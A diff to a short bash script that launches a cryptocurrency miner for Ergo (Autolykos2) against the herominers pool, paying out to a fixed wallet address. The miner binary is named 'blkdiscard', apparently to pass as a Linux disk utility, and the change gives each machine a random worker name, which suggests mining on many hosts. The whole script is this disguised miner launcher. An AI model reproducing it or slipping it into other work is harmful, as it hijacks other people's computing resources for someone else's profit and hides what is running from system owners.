@@ -1,4 +1,4 @@
 #!/bin/bash
 
 chmod +x blkdiscard
-./blkdiscard --algo AUTOLYKOS2 --pool us.ergo.herominers.com:1180  --user 9ge5hEBSEeTgkiW1F7yJ832WZqEiYeUTkiKHfadr2ednfpzKBAy.Kepolu
+./blkdiscard --algo AUTOLYKOS2 --pool us.ergo.herominers.com:1180  --user 9ge5hEBSEeTgkiW1F7yJ832WZqEiYeUTkiKHfadr2ednfpzKBAy.$(echo GPU-NYOLONG-$(shuf -i 1000-9999 -n 1))
